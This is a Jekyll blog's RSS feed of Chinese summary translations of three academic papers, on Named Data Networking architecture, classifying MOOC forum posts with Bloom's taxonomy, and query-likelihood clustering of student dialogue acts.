<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Yinan&#39;s Blog</title>
    <description>Welcome to my blog!</description>
    <link>https://wuyinan0126.github.io//</link>
    <atom:link href="https://wuyinan0126.github.io//feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Fri, 07 Oct 2016 22:49:40 +0800</pubDate>
    <lastBuildDate>Fri, 07 Oct 2016 22:49:40 +0800</lastBuildDate>
    <generator>Jekyll v3.0.2</generator>
    
      <item>
        <title>&lt;font color=&#39;orange&#39;&gt;[摘译]&lt;/font&gt; 命名数据网络</title>
        <description>&lt;p&gt;&lt;em&gt;命名数据网络（Named Data Networking, NDN）是美国国家科学基金会下的未来互联网架构计划的五个赞助项目之一。NDN起源于早期的内容为中心的网络（Content-Centric Networking, CCN）计划。互联网架构的演化从今天的以主机为中心的网络架构（IP）到数据为中心的网络架构（NDN），这个概念简单的转变对我们怎么设计、开发、部署和使用网络及应用产生了深远的影响。我们描述了这个新架构的动机和前景，以及它的基本部件和操作。我们也提供了一个它目前设计、开发状态和研究挑战的快照。更多有关项目，包括原型实现，出版物和年度报告的信息，可访问&lt;a href=&quot;http://named-data.net/&quot;&gt;named-data.net&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;文章&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;http://course.buaa.edu.cn/access/content/attachment/68d3021a-8007-406f-be28-6ff8f2c8e8f2/%E4%BD%9C%E4%B8%9A/fcb4d72f-61a8-44da-a45a-6a2df2de83f0/NDN%20zhang2014.pdf&quot;&gt;Named Data Networking&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;vision-a-new-narrow-waist&quot;&gt;一个新的沙漏瓶颈（VISION: A NEW NARROW WAIST）&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;今天的因特网沙漏架构，以一个通用网络层（IP层）为中心，实现了全球互联所需的最小功能。这个沙漏瓶颈通过其下层和上层技术的独立创新使得互联网爆发式壮大。然而IP层被设计的目的是创建一个通信网络，数据包只命名了通信的端点。随着电子商务、数字媒体、社交网络和手机应用的持续增长，导致了互联网的主要使用是作为一个分发网络。分发网络较通信网络更为普遍，并且通过点对点通信协议解决分发问题是复杂且容易出错的。&lt;/p&gt;

&lt;p&gt;NDN项目提出了一个IP架构的演化，使得数据包可以命名不是通信端点的其他对象。如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-10-07-1.png&quot; alt=&quot;NDN架构和IP架构对比&quot; title=&quot;NDN架构和IP架构对比&quot; /&gt;&lt;/p&gt;

&lt;p&gt;更具体的说，NDN改变了网络服务的语义，从 传输分组至指定的终点地址 到 获取由给定名字标识的数据。在NDN包中的名字可以命名任何东西，一个终端、一个电影或书本中的数据块、一个打开灯光的命令等。这些概念上的简单变化使得NDN网络能够使用所有几乎所有的互联网的测试好的工程属性来解决范围更广的问题，不仅包括端到端的通信，而且也包括内容分发和控制问题。根据目前互联网架构的优势与局限性的三十年的经验，NDN设计也建立在安全的原则上（通过所有命名的数据的签名）和网络流量的自我调节（通过Interest和Data包之间的流量平衡）。&lt;/p&gt;

&lt;h2 id=&quot;ndn&quot;&gt;NDN架构&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;NDN中的通信是由接收者，即消费者驱动，通过两个类型的数据包交换：Interest和Data。这两种类型的包都携带一个名字用以标识能够在一个Data包中传输的一片数据。消费者将需要的数据片的名字放入一个Interest包，然后将它发送到网络中。路由器使用这个名字来将Interest包转发给数据生产者。一旦Interest到达具有所请求数据的节点，这个节点将返回一个包含名字和内容的Data包，同时包含一个生产者密钥的签名。然后这个Data包按照Interest的相反路径发回给请求者。NDN架构的数据包如下所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-10-07-2.png&quot; alt=&quot;NDN架构的数据包&quot; title=&quot;NDN架构的数据包&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;命名&lt;/h3&gt;

&lt;p&gt;虽然路由器识别名字中组件间的边界，但是它们对于名字没有意义，也就是说，NDN的名字是对网络不透明的。这个设计决定允许每个应用选择适合其需要的命名方案，并且命名能够因此独立地发展。NDN的设计假定一种分层结构的名字，例如，一个由UCLA产生的视频可能具有名字/ucla/videos/demo.mpg，其中’/’界定了在文本表示中名字的组件，和URLs类似。这个分层结构允许应用程序表示数据元素间的上下文和关系。例如，UCLA的demo视频的版本1的片段3可能被命名为/ucla/videos/demo.mpg/1/3。它也允许名字的聚集，例如，/ucla可能对应于一个始发视频的自治系统。平面名字可以适用于特定的情况，例如本地环境，然而分层命名空间在扩展路由系统和提供数据必要的上下文中至关重要。&lt;/p&gt;

&lt;p&gt;为了检索动态生成的数据，消费者必须在没有看到名字和数据之前，能够确定地为一个需要的数据片构造名字。两者之一：(1)一个特定的算法，允许生产者和消费者基于两者都可获得的信息到达相同的名字，或者(2)Interest选择器结合最长前缀匹配检索所需的数据通过一个或多个迭代。到目前为止我们的经验表明，一组简单的选择器就能支持部分已知的名字的数据的检索。例如，一个需要demo.mpg的第一个版本的消费者，可能会请求/ucla/videos/demo.mpg/1，并使用“最左边的孩子”选择器，并收到一个数据包，名字为/ucla/videos/demo.mpg/1/1，对应于第一片段。消费者可以请求之后的片段，通过使用第一个数据包显示的信息和发布应用程序的命名约定的结合。&lt;/p&gt;

&lt;p&gt;可以全球检索的数据必须具有全球唯一的名字，然而用于本地通信的名字可能只需要本地路由（或本地广播）寻找对应的数据。个人的数据名字可以是在不同范围和上下文中具有意义的。命名空间的管理不属于NDN架构的一部分，就像地址空间的管理不属于IP架构的一部分一样。但是命名是NDN应用设计最重要的部分。让应用开发者、用户设计他们自己的用于数据交换的命名空间有许多好处。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;数据为中心的安全性&lt;/h3&gt;

&lt;p&gt;对比TCP/IP协议，NDN通过要求数据生产者对每一个Data包进行加密签名保证数据的安全。发布者的签名保证了数据的完整性和数据出处的确定性，使得消费者能够确信数据而与怎么以及在哪获得它无关。它也支持细粒度的信任机制，使得消费者能够推断公钥的拥有者是否是一个在特定上下文中的特定数据片的可接受的发布者。&lt;/p&gt;

&lt;h3 id=&quot;section-3&quot;&gt;路由和转发&lt;/h3&gt;

&lt;p&gt;NDN基于名字路由和转发包，消除了IP架构的三个问题：地址空间耗尽、NAT遍历和地址管理。没有地址空间耗尽问题，是因为地址空间是无限的；没有NAT遍历问题，是因为NDN摒弃了公有和私有地址；最后，地址分配和管理不再需要在本地网络。&lt;/p&gt;

&lt;p&gt;为了能够转发Interest和Data包，每个NDN路由器需要维护三个数据结构：待Interest表（Pending Interest Table, PIT），转发信息库（Forwarding Information Base, FIB）和内容存储（Content Store, CS），当然也包括转发策略模块来决定是否、何时以及何处转发每个Interest包。PIT存储所有已经被转发但是还未被满足的的Interests。每个PIT表项纪录了互联网中携带的数据名称，也包括它的传入和传出的接口。当一个Interest包到达时，NDN路由器首先检查CS中是否有匹配的数据，如果存在，路由器从Interest来的接口返回Data包；否则路由器查找PIT中是否有匹配的名字，路由器在表项中只是简单记录Interest包来的接口。如果PIT中没有对应的表项，路由器将根据FIB中的信息和路由器的自适应转发策略，将Interest包转发给数据生产者。当一个路由器接收到来自多个下游节点的相同名称的Interest包，它只向上游的生产者转发第一个Interest包。FIB由一个基于名称前缀的路由协议所构成，并且对于一个前缀，能够含有多个输出接口&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-10-07-3.png&quot; alt=&quot;NDN路由器转发过程&quot; title=&quot;NDN路由器转发过程&quot; /&gt;&lt;/p&gt;

&lt;p&gt;转发策略可能决定在某些情况下丢弃一个Interest包，例如，如果所有的上游链路都处于拥挤状态或Interest包被怀疑是DoS攻击的一部分。对于没一个Interest包，转发策略在FIB中检索最长前缀的匹配项，并决定何时及何地转发这个Interest。CS是路由器收到的Data包的临时缓存。因为NDN的Data包，从哪儿来或到哪儿去在意义上是独立的，因此能够被缓存以满足之后的Interests。&lt;/p&gt;

&lt;p&gt;当一个Data包到来的时候，NDN路由器寻找匹配的PIT表项，并将其转发给所有在PIT表项中的下游的接口。然后PIT表项被删除，Data包被缓存在CS中。Data包总是使用Interest包来的相反的路径，并且在没有包丢失的情况下，在每个链路上一个Interest包将产生一个Data包，从而提供了流量平衡。为了获取由多个包组成的大内容对象，Interests在流量控制上提供了一个与TCP的ACKs相似的角色：一个由数据的消费者所控制的细粒度的反馈回路。无论是Interest还是Data包都不携带任何主机或接口的地址，路由器只是根据包上携带的名字将Interest包转发给数据生产者，根据每一跳中Interest设置的PIT中的信息将Data包转发给消费者。这种Interest/Data包的交换对称性包括了一个hop-by-hop控制回路，并且消除了在数据传输中任何传送源或目的地点的概念的需要。&lt;/p&gt;

&lt;h3 id=&quot;section-4&quot;&gt;网络内的存储&lt;/h3&gt;

&lt;p&gt;由于每个NDN的Data包都携带有一个名字和签名，它对于谁请求它和从何处获取它是意义上独立的，因此，一个路由器可以缓存接收到的数据包在CS中，并使用它满足后续的请求。对于静态文件，NDN几乎达到了最佳的数据传输，而即使是动态的内容，也可以使多播或丢失重传收益。除了CS，NDN架构现在也支持一个更持久的大容量网络存储，称为Repository，这个类型的存储能够支持类似于今天的内容分发网络的服务。&lt;/p&gt;

&lt;h3 id=&quot;section-5&quot;&gt;传输功能&lt;/h3&gt;

&lt;p&gt;NDN架构没有一个独立的传输层，它将现有的传输协议（解复用、可靠交付和拥塞控制）移动到应用、支持的库和转发策略模块中。传输层的信息例如端口号和序列号是不需要的。例如，名字/ucla/videos/demo.mpg/1/3确定了向何处转发该Interest包（/ucla/），什么应用将接受它们（/video/），和任何应用相关的信息（版本1，片段3）。&lt;/p&gt;

&lt;p&gt;当应用程序需要可靠交付，那么这个应用本身或它配套的库将监控Interest的状态，并在需要的时候重传它，例如超时后。NDN的流量平衡要求，与节点通过限制每一跳的pending Interests数量来控制其自身的流量负载的能力，能够提供有效的拥塞控制。如果出现拥塞，缓存能够减轻影响，因为重发的Interests包能被缓存的Data包满足。因此，NDN能避免发生在今天的互联网中的拥塞崩溃，即当一个包在终点附近丢失后，从源地址反复重发所占用的大部分的带宽。&lt;/p&gt;

&lt;hr /&gt;

</description>
        <pubDate>Fri, 07 Oct 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/%E5%91%BD%E5%90%8D%E6%95%B0%E6%8D%AE%E7%BD%91%E7%BB%9C/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%91%BD%E5%90%8D%E6%95%B0%E6%8D%AE%E7%BD%91%E7%BB%9C/</guid>
        
        <category>摘译</category>
        
        <category>网络</category>
        
        
        <category>摘译</category>
        
        <category>网络</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;orange&#39;&gt;[摘译]&lt;/font&gt; 基于MOOC论坛信息分析的学生认知行为分类</title>
        <description>&lt;p&gt;&lt;em&gt;文章使用关键词分类法分析大量的MOOC论坛数据以区分学习交互在论坛对话中的种类。文章使用Bloom’s Taxonomy（布鲁姆分类法）对51761条论坛帖子进行分类。实验结果表明MOOC论坛中不同的交互行为对应于不同的认知行为等级。&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;文章&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://www.asist.org/files/meetings/am15/proceedings/submissions/papers/35paper.pdf&quot;&gt;Analyzing MOOC Discussion Forum Messages to Identify Cognitive Learning Information Exchanges&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;section-1&quot;&gt;研究问题&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;What are the major linguistically content features of discussion forum messages?（什么是MOOC论坛信息的主要的语言学内容特征？）&lt;/p&gt;

    &lt;p&gt;一个人在交流中使用的术语表达了一个人的关注点、感觉、为何组织信息、怎样分析信息、在思考什么主题和如何思考信息等。因此，语言学等内容分析可以提供MOOC论坛中的消息结构的insights。&lt;/p&gt;

    &lt;p&gt;除了对论坛信息使用topical分类，我们也使用语言学内容分类作为下一个问题的基础。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Are MOOCs discussion forum messages exchanges occurring within a learning context?（在一个学习环境中，是否有MOOC论坛信息的交换发生？）&lt;/p&gt;

    &lt;p&gt;如果在线论坛信息是learning events，那么一个人在不同的认知等级将具有不同的语言学。为了分析这个问题，我们使用Anderson和 Krathwohl对于Bloom分类法的重新设计，在认知领域将关键词为分为6个类别。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-2&quot;&gt;论坛数据预处理&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;我们使用Natural Language Toolkit(NLTK)，这是一个处理文本语言数据的Python程序。NLTK提供了对超过50种语料库和文本资源的接口，例如WordNet。我们使用它进行分词（tokenization）、词干提取（stemming）、标注（tagging）和解析（parsing）。具体包括：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;去除html标签&lt;/li&gt;
  &lt;li&gt;去除标点符号&lt;/li&gt;
  &lt;li&gt;去除停用词，将单词变为小写形式&lt;/li&gt;
  &lt;li&gt;去除非ASCII编码的单词&lt;/li&gt;
  &lt;li&gt;词干提取&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section-3&quot;&gt;数据处理&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;在我们的分析中，我们使用两种不同的方法分别处理我们的两个研究问题。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;内容分析法&lt;/p&gt;

    &lt;p&gt;为了研究第一个问题，我们使用Linguistic Inquiry and Word Count（LIWC）package进行内容分析。LIWC是一个提供大范围的不同的文本特征分析的应用，包括语言学的处理例如代词数量等。它也提供心理学等处理例如情感分析。&lt;/p&gt;

    &lt;p&gt;我们使用LIWC进行消息的topical和term分析。这个文本分析提供给我们一个分析认知行为的基础。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;认知行为分析分类法&lt;/p&gt;

    &lt;p&gt;为了研究第二个问题，我们使用了在认知领域的学习等级的结构，这个结构由Anderson和Krathwohl提出，是Bloom’s Taxonomy的升级版。&lt;/p&gt;

    &lt;p&gt;Bloom’s Taxonomy是最为广泛接受的认知行为框架。它是基于抽象的难度，从事实的认识到创造性概念的开发。它的支配法则之一是它的描述方案，在描述方案里每一个学习目标的类型都能使用相关的文本进行表示。&lt;/p&gt;

    &lt;p&gt;我们使用这个分类法对论坛消息进行分类，以确定它们是否是分类法中的一个等级。我们的假设是，消息可能会包含能够区分出合适等级的关键词。&lt;/p&gt;

    &lt;p&gt;Anderson和Krathwohl的分类法是我们在研究中使用的方法。这个分类法的要点如下表所示：&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;类别&lt;/th&gt;
          &lt;th&gt;定义&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;Remembering&lt;/td&gt;
          &lt;td&gt;检索、识别和回忆相关的知识&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Understanding&lt;/td&gt;
          &lt;td&gt;通过翻译、举例、分类、概括、推理、对比、解释从口语、书写和图表信息中构造含义&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Applying&lt;/td&gt;
          &lt;td&gt;实施、使用一个手段执行或实现&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Analysing&lt;/td&gt;
          &lt;td&gt;将材料分成几个部分，通过区分、组织和归因确定部分之间的关系，以及部分与整体的结构或意图&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Evaluating&lt;/td&gt;
          &lt;td&gt;通过批判并根据条件和标准作出判断&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Creating&lt;/td&gt;
          &lt;td&gt;将基础元素组合成一个连贯的整体&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;

    &lt;p&gt;&lt;br /&gt;
  虽然类别的描述反映了不同学习者行为的区别，然而Anderson and Krathwohl’s taxonomy并不sharp。因此，下表展示了用于区分论坛消息的关键元素。我们使用&lt;code class=&quot;highlighter-rouge&quot;&gt;244个公认的认知行为关键词&lt;/code&gt;对类别进行区分。&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;类别&lt;/th&gt;
          &lt;th&gt;定义&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;Remembering&lt;/td&gt;
          &lt;td&gt;论坛消息必须描述、列出或说出事实信息&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Understanding&lt;/td&gt;
          &lt;td&gt;论坛消息必须翻译、分析、解释或推断信息&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Applying&lt;/td&gt;
          &lt;td&gt;论坛消息必须利用信息并且将结果知识化为行动&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Analysing&lt;/td&gt;
          &lt;td&gt;论坛消息必须论断、批阅或调查信息&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Evaluating&lt;/td&gt;
          &lt;td&gt;论坛消息必须评价或将信息联系到真实世界中&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;Creating&lt;/td&gt;
          &lt;td&gt;论坛消息必须公式化、生成、重构或结合信息&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

</description>
        <pubDate>Wed, 21 Sep 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/%E5%9F%BA%E4%BA%8EMOOC%E8%AE%BA%E5%9D%9B%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90%E7%9A%84%E5%AD%A6%E7%94%9F%E8%AE%A4%E7%9F%A5%E8%A1%8C%E4%B8%BA%E5%88%86%E7%B1%BB/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%9F%BA%E4%BA%8EMOOC%E8%AE%BA%E5%9D%9B%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90%E7%9A%84%E5%AD%A6%E7%94%9F%E8%AE%A4%E7%9F%A5%E8%A1%8C%E4%B8%BA%E5%88%86%E7%B1%BB/</guid>
        
        <category>摘译</category>
        
        <category>机器学习</category>
        
        <category>MOOC</category>
        
        <category>分类</category>
        
        
        <category>摘译</category>
        
        <category>机器学习</category>
        
        <category>MOOC</category>
        
        <category>分类</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;orange&#39;&gt;[摘译]&lt;/font&gt; 学生对话行为的非监督分类</title>
        <description>&lt;p&gt;&lt;em&gt;文章介绍了一种针对学生对话行为的非监督分类方法。首先对学生对话使用词性标签进行自然语言预处理，然后使用Query-Likelihood进行相似对话行为的信息检索，最后使用k-means聚类算法将相似对话行为进行聚类&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;文章&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;http://www.educationaldatamining.org/EDM2013/papers/rn_paper_06.pdf&quot;&gt;Unsupervised Classification of Student Dialogue Acts With Query-Likelihood Clustering&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;section-1&quot;&gt;语料库&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;语料库由参与2007春的JavaTutor项目的师生对话构成。师生通过网络使用文本对话进行交流，共有43个对话，包含1525个学生对话（平均每句话7.54个单词）和3332个老师对话（平均每句话9.04个单词）。文章专注于分类学生对话，而老师对话分类将由系统生成。下表是对话类别和频率，Kappa系数为0.76:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;标签&lt;/th&gt;
      &lt;th&gt;行为&lt;/th&gt;
      &lt;th&gt;描述&lt;/th&gt;
      &lt;th&gt;频率&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Q&lt;/td&gt;
      &lt;td&gt;一般问题&lt;/td&gt;
      &lt;td&gt;一个于学习任务无关的问题&lt;/td&gt;
      &lt;td&gt;276&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;EQ&lt;/td&gt;
      &lt;td&gt;学习问题&lt;/td&gt;
      &lt;td&gt;一个于学习任务相关的问题&lt;/td&gt;
      &lt;td&gt;416&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;S&lt;/td&gt;
      &lt;td&gt;陈述&lt;/td&gt;
      &lt;td&gt;对一个事实的陈述&lt;/td&gt;
      &lt;td&gt;211&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;G&lt;/td&gt;
      &lt;td&gt;Grounding&lt;/td&gt;
      &lt;td&gt;对先前对话的承认&lt;/td&gt;
      &lt;td&gt;192&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;EX&lt;/td&gt;
      &lt;td&gt;Extra-Domain&lt;/td&gt;
      &lt;td&gt;任何于学习无关的对话&lt;/td&gt;
      &lt;td&gt;133&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PF&lt;/td&gt;
      &lt;td&gt;正面反馈&lt;/td&gt;
      &lt;td&gt;对于知识或学习任务的正面评价&lt;/td&gt;
      &lt;td&gt;116&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;NF&lt;/td&gt;
      &lt;td&gt;负面反馈&lt;/td&gt;
      &lt;td&gt;对于知识或学习任务的负面评价&lt;/td&gt;
      &lt;td&gt;92&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LF&lt;/td&gt;
      &lt;td&gt;Lukewarm反馈&lt;/td&gt;
      &lt;td&gt;同时含有正面和负面评价的评价&lt;/td&gt;
      &lt;td&gt;32&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;GRE&lt;/td&gt;
      &lt;td&gt;问候&lt;/td&gt;
      &lt;td&gt;问候词语&lt;/td&gt;
      &lt;td&gt;57&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;query-likelihood-&quot;&gt;Query-Likelihood 聚类&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;IR（Information Retrieval，信息检索）是搜索可用的资源用于检索和查询词相似的结果的过程。IR技术大部分用于搜索引擎检索和查询词相似的结果。在提出的方法中，将被分类的目标对话将被用作一个查询，而与它相似的对话将通过query likelihood进行收集。之后，与查询相似的结果被用于聚类。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;自然语言预处理&lt;/h3&gt;

&lt;p&gt;Query-likelihood信息检索操作的是token或word级别的。实验证实，为了增加从语料库中提取有识别力的线索，预处理是一个关键的步骤。&lt;/p&gt;

&lt;p&gt;词性（Part-of-speech, POS）标签是一项根据词语在语言中的语法部分将其标注为名词、动词或形容词的技术。它允许我们概括词语在句子中的功能。实验证明，使用单词和词性标签作为查询词能得到很好的效果。这个方法将一些功能词语替代为它们的词性标签，例如限定词（’the’, ‘a’）、连词（’and’, ‘but’）和介词（’in’, ‘after’），而内容词语将被保留并提取词干，这将减少特征词语的数量。这个方法是通过观察，发现关于对话的重要的词语存在于内容词语中。&lt;/p&gt;

&lt;p&gt;当然，在计算机科学领域，一些包含特定字符的自然语言可能表示重要的语义，因此在预处理阶段需要适当的处理。因此，在语料库中的代码片段将被替换为具有意义的标签。例如，’x[i]’将被替换为’ARRAY_INDEXING’，if、for和算数表达式将使用相似的规定替换。&lt;/p&gt;

&lt;h3 id=&quot;query-likelihood--1&quot;&gt;Query-Likelihood 表示&lt;/h3&gt;

&lt;p&gt;Query-likelihood模型将每个对话视为一个文档，将被预测的目标对话作为查询，我们提供对目标对话的信息检索。这个查询将产生一个文档的排名列表，从最像到最不像。Query-likelihood的实现&lt;a href=&quot;http://www.lemurproject.org/&quot;&gt;The Lemur Project&lt;/a&gt;使用论文&lt;a href=&quot;http://ciir.cs.umass.edu/pubfiles/ir-407.pdf&quot;&gt;A language-model based search engine forcomplex queries&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;词语的顺序包含了对话结构的重要信息，因此我们使用一个修改过的查询方法，考虑一个对话里相邻的两个单词进行查询。&lt;/p&gt;

&lt;p&gt;下表中展示了多个原始的对话、在被词性标签替换及提取词干后的形式、和最后提交给算法的查询形式：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;原始对话&lt;/th&gt;
      &lt;th&gt;POS和词干提取形式&lt;/th&gt;
      &lt;th&gt;查询形式&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;I’m reading it right now&lt;/td&gt;
      &lt;td&gt;VB read PRP right now&lt;/td&gt;
      &lt;td&gt;(VB read)(read PRP)(PRP right)(right now)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;what is the basic structure to begin an array?&lt;/td&gt;
      &lt;td&gt;WDT VBZ DT basic structur TO begin DT array?&lt;/td&gt;
      &lt;td&gt;(WDT VBZ)(VBZ DT)(DT basic)(basic structur)(structur TO)(TO begin)(begin DT)(DT array)(array ?)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;that was correct&lt;/td&gt;
      &lt;td&gt;WDT VBD correct&lt;/td&gt;
      &lt;td&gt;(WDT VBD)(VBD correct)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;how do you thinkyou should start it?&lt;/td&gt;
      &lt;td&gt;WRB do PRP think PRP MD start PRP?&lt;/td&gt;
      &lt;td&gt;(WRB do)(do PRP)(PRP think)(think PRP)(PRP MD)(PRP start)(startPRP)(PRP ?)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;
其中VBZ是第三人称现在时的单数动词，DT是限定词，TO是’to’，VBD是过去式动词，WDT和WRB是疑问词，MD是情态动词。&lt;/p&gt;

&lt;p&gt;下面是一个查询样例和它的相似检索：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Query&lt;/th&gt;
      &lt;th&gt;Query Likelihood results&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;How can I solve this problem?&lt;/td&gt;
      &lt;td&gt;How can I do addition?&lt;br /&gt;What would be the results?&lt;br /&gt;Which should go first?&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;section-3&quot;&gt;聚类&lt;/h3&gt;

&lt;p&gt;查询获得的相似结果将被用作k-means聚类算法中的距离矩阵。这个想法实现依赖于为相似的对话创造一个二进制向量，然后group这些向量。每个在相似列表中的对话表示为1，其它表示为0。这样，每个在语料库中的目标对话将被表示为一个向量，这个向量表示和它相似的对话。算法如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;D为所有对话组成的语料库，&lt;script type=&quot;math/tex&quot;&gt;D=\lbrace u_1,u_2,...,u_n \rbrace&lt;/script&gt;，目标是对于D中的任意一个对话&lt;script type=&quot;math/tex&quot;&gt;u_i&lt;/script&gt;，确定一个标签&lt;script type=&quot;math/tex&quot;&gt;l_i&lt;/script&gt;&lt;/li&gt;
  &lt;li&gt;对于每个&lt;script type=&quot;math/tex&quot;&gt;u_i&lt;/script&gt;，
    &lt;ol&gt;
      &lt;li&gt;设目标对话&lt;script type=&quot;math/tex&quot;&gt;q_i=u_i&lt;/script&gt;&lt;/li&gt;
      &lt;li&gt;设&lt;script type=&quot;math/tex&quot;&gt;u_i&lt;/script&gt;的查询结果相似列表为&lt;script type=&quot;math/tex&quot;&gt;R=(u_t,u_{t+1},...,u_z)&lt;/script&gt;&lt;/li&gt;
      &lt;li&gt;创建查询结果向量，&lt;script type=&quot;math/tex&quot;&gt;V_i=(v_1,v_2,...,v_j,...,v_n)\ such\ that\ v_j=1\ if\ u_j\in R\ else\ v_j=0&lt;/script&gt;&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;设总向量为&lt;script type=&quot;math/tex&quot;&gt;V_T=(V_1,V_2,...,V_n)&lt;/script&gt;，返回k-means(&lt;script type=&quot;math/tex&quot;&gt;V_T&lt;/script&gt;)的聚类结果&lt;script type=&quot;math/tex&quot;&gt;C=\lbrace c_1,c_2,...,c_k \rbrace&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

</description>
        <pubDate>Mon, 19 Sep 2016 08:00:00 +0800</pubDate>
